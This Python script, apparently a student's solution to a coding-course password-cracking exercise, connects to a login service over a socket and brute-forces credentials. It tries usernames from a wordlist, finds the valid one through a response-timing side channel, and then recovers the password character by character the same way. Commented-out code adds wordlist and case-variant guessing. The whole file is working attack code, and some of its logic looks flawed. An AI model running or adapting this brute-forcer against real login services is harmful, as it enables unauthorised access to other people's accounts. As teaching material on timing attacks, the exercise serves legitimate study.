# write your code here
import socket
import argparse
import string
import itertools
import json
from datetime import datetime

parser = argparse.ArgumentParser(description='Connects to an ip and port')
parser.add_argument("ip", type=str, help="IP address")
parser.add_argument("port", type=int, help="PORT")
# parser.add_argument("message", type=str, help="Message to send")

args = parser.parse_args()

ip = args.ip
port = args.port
# message = args.message

def check_login():
    with open("F:/haidook/Projects/JBAcademy/logins.txt") as f:
        for user in f.read().splitlines():
            yield user

user = check_login()

def try_users():
    test = next(user)
    return test

def all_variable_pass():
    with open("F:/haidook/Projects/JBAcademy/passwords.txt") as f:
        for password in f.read().splitlines():
            if password.isdigit():
                yield password
            else:
                all_low = list(password.lower())
                all_upp = list(password.upper())
                test = list(zip(all_low, all_upp))
                for i in range(len(test)):
                    for y in itertools.product(*test):
                        yield ''.join(y)

def possible_passwords(n):
    az = list(string.ascii_letters)
    zeronine = list(string.digits)
    for i in range(1, n):
        for x in itertools.combinations(itertools.chain(az, zeronine), i):
            yield ''.join(x)

# password = possible_passwords(2)
# password = all_variable_pass()

# def try_passwords():
#     test = next(password)
#     return test

# def find_pass():
#     pass_to_try = try_passwords()
#     return pass_to_try

def create_json(user, password=""):
    json_test = json.dumps({"login": user,
                             "password": password}, indent=4)
    return json_test

def connect_to(ip, port):
    with socket.socket() as new_socket:
        new_socket.connect((ip, port))
        # print('Conn success!')
        # new_socket.send(message.encode())
        try:
            while True:
                correct_pass = ''
                user_to_try = try_users()
                start = datetime.now()
                new_socket.send(create_json(user_to_try).encode())
                response = json.loads(new_socket.recv(1024))
                finish = datetime.now()
                difference = (finish - start).microseconds
                if difference > 50000:
                    correct_user = user_to_try
                    correct_pass = ''
                    break
                # if response['result'] == 'Exception happened during login':
                #     correct_user = user_to_try
                #     correct_pass = ''
                #     break
            while True:
                password = list(possible_passwords(2))
                for x in password:
                    pass_to_try = x
                    start = datetime.now()
                    new_socket.send(create_json(correct_user, correct_pass + pass_to_try).encode())
                    response = json.loads(new_socket.recv(1024))
                    finish = datetime.now()
                    difference = (finish - start).microseconds
                    if difference > 50000:
                    # if response['result'] == 'Exception happened during login':
                        correct_pass += pass_to_try
                    elif response['result'] == 'Connection success!':
                        correct_pass += pass_to_try
                        result = create_json(correct_user, correct_pass)
                        break
        except ConnectionAbortedError:
            print(result)
        except ConnectionResetError:
            print(result)


        # while True:
        #     pass_to_try = try_passwords()
        #     # print(pass_to_try)
        #     new_socket.send(pass_to_try.encode())
        #     response = new_socket.recv(1024).decode()
        #     # print(response)
        #     if response == 'Too many attempts':
        #         print(response)
        #         break
        #     elif response == 'Connection success!':
        #         print(pass_to_try)
        #         break
        # print(response)

connect_to(ip, port)
